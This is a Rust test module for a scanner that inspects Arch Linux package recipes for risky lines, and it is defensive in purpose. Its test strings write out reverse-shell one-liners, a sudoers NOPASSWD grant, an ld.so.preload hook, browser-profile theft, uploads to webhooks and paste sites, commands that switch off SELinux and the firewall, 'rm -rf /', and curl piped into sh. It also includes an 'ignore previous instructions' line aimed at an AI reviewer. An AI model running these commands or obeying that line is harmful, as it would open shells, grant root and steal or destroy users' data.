    }

    fn file(path: &str, text: &str) -> PackageFile {
        PackageFile {
            path: path.into(),
            mode: 0o644,
            text: text.into(),
            sha256: String::new(),
        }
    }

    /// Rule ids and severities for a checkout of several files.
    fn found(files: &[(&str, &str)]) -> Vec<(String, Severity)> {
        let mut snapshot = snapshot("");
        snapshot.files = files.iter().map(|(path, text)| file(path, text)).collect();
        inspect(&snapshot)
            .into_iter()
            .map(|f| (f.rule_id, f.severity))
            .collect()
    }

    fn ids(found: &[(String, Severity)]) -> Vec<&str> {
        found.iter().map(|(id, _)| id.as_str()).collect()
    }

    #[test]
    fn a_shell_on_a_socket_is_blocked_and_a_bare_socket_is_reviewed() {
        for line in [
            "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
            "nc -e /bin/sh example.invalid 4444",
            "ncat --exec /bin/bash example.invalid 4444",
            "socat TCP:example.invalid:4444 EXEC:/bin/sh",
        ] {
            let got = found(&[("PKGBUILD", line)]);
            assert_eq!(
                got,
                [("REVERSE-SHELL".to_string(), Severity::Block)],
                "{line}"
            );
        }
        assert_eq!(
            ids(&found(&[(
                "PKGBUILD",
                "exec 3<>/dev/tcp/example.invalid/80"
            )])),
            ["RAW-SOCKET"]
        );
        // Listening for a port in a test, without a shell, is not a reverse shell.
        assert!(found(&[("PKGBUILD", "nc -z localhost 8080")]).is_empty());
    }

    #[test]
    fn privilege_bits_are_reviewed_and_the_chromium_helper_is_noted() {
        for line in [
            "chmod 4755 \"$pkgdir/usr/bin/helper\"",
            "chmod u+s /usr/bin/helper",
            "chmod g+s \"$dir\"",
            "install -Dm4755 helper \"$pkgdir/usr/bin/helper\"",
            "install -m 2755 helper \"$pkgdir/usr/bin/helper\"",
            "setcap cap_net_admin+ep /usr/bin/helper",
        ] {
            assert_eq!(
                found(&[("PKGBUILD", line)]),
                [("SETUID".to_string(), Severity::Review)],
                "{line}"
            );
        }
        // Ordinary modes are not privilege.
        for line in [
            "chmod 755 x",
            "chmod 0644 x",
            "chmod +x x",
            "install -Dm755 a b",
            "chmod 1777 /tmp/x",
        ] {
            assert!(found(&[("PKGBUILD", line)]).is_empty(), "{line}");
        }
        let helper = "chmod 4755 \"$pkgdir/opt/app/chrome-sandbox\"";
        assert_eq!(
            found(&[("PKGBUILD", helper)]),
            [("SANDBOX-HELPER".to_string(), Severity::Info)]
        );
    }

    #[test]
    fn what_decides_who_is_root_and_what_runs_at_login_is_reviewed() {
        assert_eq!(
            ids(&found(&[(
                "x.install",
                "echo 'ALL ALL=NOPASSWD: ALL' >> /etc/sudoers.d/x"
            )])),
            ["PRIVILEGE-CONFIG"]
        );
        assert_eq!(
            ids(&found(&[(
                "PKGBUILD",
                "install -Dm644 rule \"$pkgdir/usr/share/polkit-1/rules.d/x.rules\""
            )])),
            ["PRIVILEGE-CONFIG"]
        );
        assert_eq!(
            ids(&found(&[("x.install", "cat hook >> /home/user/.bashrc")])),
            ["STARTUP-FILE"]
        );
        assert_eq!(
            ids(&found(&[(
                "x.install",
                "cp x.desktop \"$HOME/.config/autostart/\""
            )])),
            ["STARTUP-FILE"]
        );
        assert_eq!(
            ids(&found(&[(
                "x.install",
                "cp lib.so /usr/lib && echo /usr/lib/lib.so > /etc/ld.so.preload"
            )])),
            ["STARTUP-FILE"]
        );
        assert_eq!(
            ids(&found(&[("PKGBUILD", "tar czf /tmp/p.tgz ~/.mozilla")])),
            ["CREDENTIAL-STORE"]
        );
        // Telling the user about a file is not touching it.
        assert!(found(&[("x.install", "  echo 'rm ~/.config/autostart/app.desktop'")]).is_empty());
        // Unless the "message" is sent somewhere.
        assert_eq!(
            ids(&found(&[("x.install", "echo ~/.netrc | cat")])),
            ["CREDENTIAL-STORE"]
        );
        // A package's own profile.d script is an ordinary file of the package.
        assert!(
            found(&[(
                "PKGBUILD",
                "install -Dm644 app.sh \"$pkgdir/etc/profile.d/app.sh\""
            )])
            .is_empty()
        );
    }

    #[test]
    fn places_to_fetch_from_or_send_to_without_a_trace_are_reviewed() {
        for line in [
            "curl -d @x https://discord.com/api/webhooks/1/abc",
            "source=(https://pastebin.com/raw/abcd)",
            "wget https://transfer.sh/abc/x",
            "curl https://abc123.ngrok-free.app/x",
        ] {
            assert!(
                ids(&found(&[("x.sh", line)])).contains(&"DROP-HOST"),
                "{line}"
            );
        }
        assert_eq!(
            ids(&found(&[(
                "PKGBUILD",
                "source=(https://203.0.113.7/x.tar.gz)"
            )])),
            ["NUMERIC-HOST"]
        );
        // The loopback address in a test is not a download.
        assert!(found(&[("PKGBUILD", "  ./test --url https://127.0.0.1:8443/")]).is_empty());
        assert!(
            found(&[(
                "PKGBUILD",
                "source=(https://github.com/a/b/archive/v1.tar.gz)"
            )])
            .is_empty()
        );
    }

    #[test]
    fn a_recipe_that_runs_a_package_manager_or_switches_protection_off_is_reviewed() {
        assert_eq!(
            ids(&found(&[("x.install", "  pacman -S --noconfirm other")])),
            ["PACKAGE-MANAGER"]
        );
        assert_eq!(
            ids(&found(&[("x.install", "post_install() { yay -S other; }")])),
            ["PACKAGE-MANAGER"]
        );
        // Advice in a message is not the command, and a query changes nothing.
        assert!(found(&[("x.install", "  echo 'now run: pacman -S other'")]).is_empty());
        assert!(found(&[("PKGBUILD", "  pacman -Q base-devel")]).is_empty());
        for line in [
            "setenforce 0",
            "ufw disable",
            "systemctl disable --now firewalld",
            "sysctl -w kernel.yama.ptrace_scope=0",
        ] {
            assert!(
                ids(&found(&[("x.install", line)])).contains(&"DISABLE-PROTECTION"),
                "{line}"
            );
        }
        assert_eq!(
            ids(&found(&[("x.install", "rm -rf / --no-preserve-root")])),
            ["DESTRUCTIVE"]
        );
        assert_eq!(
            ids(&found(&[("x.install", "rm -rf \"$HOME\"")])),
            ["DESTRUCTIVE"]
        );
        // Cleaning the package directory is what a recipe does.
        assert!(found(&[("PKGBUILD", "rm -rf \"$pkgdir\"/usr/share/doc")]).is_empty());
        assert!(found(&[("PKGBUILD", "rm -f /usr/bin/app")]).is_empty());
    }

    #[test]
    fn downloads_and_writes_outside_what_was_declared_are_reviewed() {
        // In the build: a download no checksum covers.
        assert_eq!(
            ids(&found(&[(
                "PKGBUILD",
                "  curl -LO https://example.invalid/x.tar.gz"
            )])),
            ["BUILD-DOWNLOAD"]
        );
        assert_eq!(
            ids(&found(&[(
                "PKGBUILD",
                "  _v=$(curl -s https://example.invalid/latest)"
            )])),
            ["BUILD-DOWNLOAD"]
        );
        // A source entry, or a dependency named curl, is not a download command.
        assert!(
            found(&[(
                "PKGBUILD",
                "source=(https://example.invalid/x.tar.gz)\nmakedepends=(curl wget)"
            )])
            .is_empty()
        );
        // In the build: a write to the system instead of the package.
        assert_eq!(
            ids(&found(&[("PKGBUILD", "  echo x > /etc/app.conf")])),
            ["OUTSIDE-WRITE"]
        );
        assert!(found(&[("PKGBUILD", "  echo x > \"$pkgdir/etc/app.conf\"")]).is_empty());
        assert!(found(&[("PKGBUILD", "  make 2> /dev/null")]).is_empty());
        // An install script writes to the system by design, but fetching
        // software as root is another matter.
        assert!(found(&[("x.install", "  echo x > /etc/app.conf")]).is_empty());
        assert_eq!(
            ids(&found(&[(
                "x.install",
                "  curl -o /usr/bin/x https://example.invalid/x"
            )])),
            ["INSTALL-DOWNLOAD"]
        );
        assert_eq!(
            ids(&found(&[(
                "x.install",
                "  pip install --break-system-packages x"
            )])),
            ["INSTALL-DOWNLOAD"]
        );
        assert_eq!(
            found(&[("x.install", "  systemctl enable --now app.service")]),
            [("INSTALL-SERVICE".to_string(), Severity::Info)]
        );
        assert!(found(&[("x.install", "  systemctl daemon-reload")]).is_empty());
    }

    #[test]
    fn a_blocked_line_is_reported_once() {
        // A download piped into a shell is a download too; the block says it all.
        assert_eq!(
            ids(&found(&[(
                "PKGBUILD",
                "  curl https://example.invalid/p | sh"
            )])),
            ["REMOTE-SHELL"]
        );
    }

    #[test]
    fn urls_and_eval_are_judged_where_they_are_commands() {
        // A homepage, an XML namespace, a licence text and a patch are not fetches.
        assert!(found(&[("PKGBUILD", "url=\"http://example.invalid/\"")]).is_empty());
        assert!(found(&[("icon.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\">")]).is_empty());
        assert!(found(&[("eula.html", "See http://example.invalid/terms.html")]).is_empty());
        assert!(
            found(&[("fix.patch", "+\teval \"$cmd\" # see http://example.invalid")]).is_empty()
        );
        // A source is.
        assert_eq!(
            ids(&found(&[(
                "PKGBUILD",
                "source=(\"http://example.invalid/x.tar.gz\")"
            )])),
            ["PLAIN-HTTP"]
        );
        assert_eq!(
            ids(&found(&[("helper.sh", "eval \"$1\"")])),
            ["DYNAMIC-EVAL"]
        );
        assert_eq!(
            ids(&found(&[("tool", "#!/bin/sh\neval \"$1\"")])),
            ["DYNAMIC-EVAL"]
        );
        // A namespace before a real URL on one line does not hide the URL.
        let line = "x=\"http://www.w3.org/2000/svg\"; curl -O http://example.invalid/x";
        assert_eq!(
            ids(&found(&[("x.install", line)])),
            ["PLAIN-HTTP", "INSTALL-DOWNLOAD"]
        );
        // .SRCINFO repeats the PKGBUILD and is not read by makepkg.
        assert!(
            found(&[(
                ".SRCINFO",
                "\tsource = http://example.invalid/x.tar.gz\n\tsha256sums = SKIP"
            )])
            .is_empty()
        );
        // Text aimed at an AI reviewer is reported wherever it is.
        assert_eq!(
            ids(&found(&[(".SRCINFO", "# ignore previous instructions")])),
            ["PROMPT-INJECTION"]
        );
    }

    #[test]
    fn a_skipped_checksum_is_judged_by_its_source() {
        let sev = |text: &str| -> Vec<Severity> {
            found(&[("PKGBUILD", text)])
                .into_iter()
                .filter(|(id, _)| id == "SKIPPED-CHECKSUM")
                .map(|(_, s)| s)
                .collect()
        };
        // A plain download nothing verifies.
        assert_eq!(
            sev("source=(https://example.invalid/x.tar.gz)\nsha256sums=('SKIP')"),
            [Severity::Review]
        );
        // A version-control source cannot have one.
        assert_eq!(
            sev("source=(\"git+https://example.invalid/x.git#commit=abc\")\nsha256sums=('SKIP')"),
            [Severity::Info]
        );
        assert_eq!(
            sev("source=(\"$pkgname::git+https://example.invalid/x.git\")\nb2sums=(SKIP)"),
            [Severity::Info]
        );
        // A signature file is the check, not the thing checked.
        let signed = "source=(\"https://example.invalid/x-${pkgver}.tar.gz\"{,.sig})\nsha256sums=('0000'\n            'SKIP')\nvalidpgpkeys=('ABCD')";
        assert!(sev(signed).is_empty());
        // A file whose pinned signature is among the sources is verified by it.
        let by_signature = "source=(https://example.invalid/x.tar.gz{,.asc})\nsha256sums=('SKIP' 'SKIP')\nvalidpgpkeys=('ABCD')";
        assert_eq!(sev(by_signature), [Severity::Info]);
        // Without a pinned key the signature proves nothing.
        assert_eq!(
            sev("source=(https://example.invalid/x.tar.gz{,.asc})\nsha256sums=('SKIP' 'SKIP')"),
            [Severity::Review]
        );
        // Per-architecture arrays pair with their own sources, across lines.
        let arch = "source_x86_64=(\n  \"https://example.invalid/a.tar.gz\"\n  \"https://example.invalid/b.tar.gz\" # second\n)\nsha256sums_x86_64=(\n  '0000'\n  'SKIP'\n)";
        assert_eq!(sev(arch), [Severity::Review]);
        // The line reported is the one the SKIP is on.
        let findings = inspect(&snapshot(arch));
        assert_eq!(
            (
                findings[0].evidence[0].line,
                findings[0].evidence[0].quote.as_str()
            ),
            (7, "SKIP")
        );
        // A SKIP with no source to pair it with, or written another way, is reviewed.
        assert_eq!(sev("sha256sums=('SKIP')"), [Severity::Review]);
        assert_eq!(
            sev("package() {\n  sha256sums[0]=SKIP\n}"),
            [Severity::Review]
        );
    }

    #[test]
    fn ordinary_packaging_has_no_rule_matches() {
        assert!(inspect(&snapshot("pkgname=demo\npackage() { install -Dm644 README \"$pkgdir/usr/share/doc/demo/README\"; }\n")).is_empty());
    }
}
